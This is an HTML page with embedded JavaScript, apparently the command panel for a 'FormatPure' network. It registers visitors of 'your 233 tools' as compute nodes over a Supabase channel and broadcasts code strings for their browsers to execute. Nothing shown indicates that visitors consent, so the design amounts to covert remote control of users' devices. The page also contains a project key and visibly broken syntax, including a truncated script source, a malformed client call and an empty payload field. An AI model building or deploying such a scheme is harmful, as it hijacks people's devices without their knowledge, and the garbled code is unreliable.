<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FormatPure Ecosystem Control Room</title>
    <!-- Load the exact same Supabase engine -->
    <script src="https://jsdelivr.net"></script>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; }
        .card { background: #1e293b; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
        button { background: #10b981; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        #logs { font-family: monospace; background: #020617; padding: 10px; border-radius: 4px; max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>

    <h1>🚀 FormatPure Grid Command Center</h1>
    
    <div class="card">
        <h3>Network Health</h3>
        <p>Active Cluster Nodes Detected: <span id="node-count" style="color:#10b981; font-weight:bold;">0</span></p>
    </div>

    <div class="card">
        <h3>Dispatch Computing Job</h3>
        <button id="send-job-btn">Broadcast Sample Math Task</button>
    </div>

    <div class="card">
        <h3>Live Network Streaming Logs</h3>
        <div id="logs">Initializing command uplink...</div>
    </div>

    <script>
        // Update these with your exact Supabase credentials
        const SUPABASE_URL = "     https://lfgykohxvtsdidwgrrpc.supabase.co  ";
        const SUPABASE_ANON_KEY = "    sb_publishable_w4sWU_px1mPoCMfjwh93Kg_PB8ISCRg  ";
'
        const supabase = supabase.createClient(  ' https:// lfgykohxvtsdidwgrrpc.supabase.co    ,  sb_publishable_w4sWU_px1mPoCMfjwh93Kg_PB8ISCRg '  );
        const channel = supabase.channel('computing_mesh_pool');
        
        let discoveryPool = new Set();

        function log(msg) {
            const logsDiv = document.getElementById('logs');
            logsDiv.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        channel
            // 1. Listen for users opening your 233 tools
            .on('broadcast', { event: 'NODE_REGISTERED' }, (payload) => {
                discoveryPool.add(payload.payload.nodeId);
                document.getElementById('node-count').innerText = discoveryPool.size;
                log(`🟢 Mesh Node Discovered! ID: ${payload.payload.nodeId.substring(0,8)} (Cores: ${payload.payload.cores})`);
            })
            // 2. Listen for completed calculations streaming back to you
            .on('broadcast', { event: 'JOB_COMPLETE' }, (payload) => {
                log(`✅ Job ${payload.payload.taskId} verified from Node ${payload.payload.nodeId.substring(0,8)}! Result: ${payload.payload.result}`);
            })
            .subscribe((status) => {
                if (status === 'SUBSCRIBED') {
                    log("📡 Uplink Established. Listening for active edge nodes on FormatPure...");
                }
            });

        // 3. Command logic to push out a test job to your traffic network
        document.getElementById('send-job-btn').addEventListener('click', () => {
            const taskId = crypto.randomUUID();
            log(`📡 Dispatching Job ID: ${taskId}...`);
            
            channel.send({
                type: 'broadcast',
                event: 'DISPATCH_JOB',
                payload: {
                    taskId: taskId,
                    // The raw data payload to send to your users' devices
                    payload:,
                    // The pure processing instructions the edge browser executes
                    logic: "return data.map(x => x * 2);" 
                }
            });
        });
    </script>
</body>
</html>
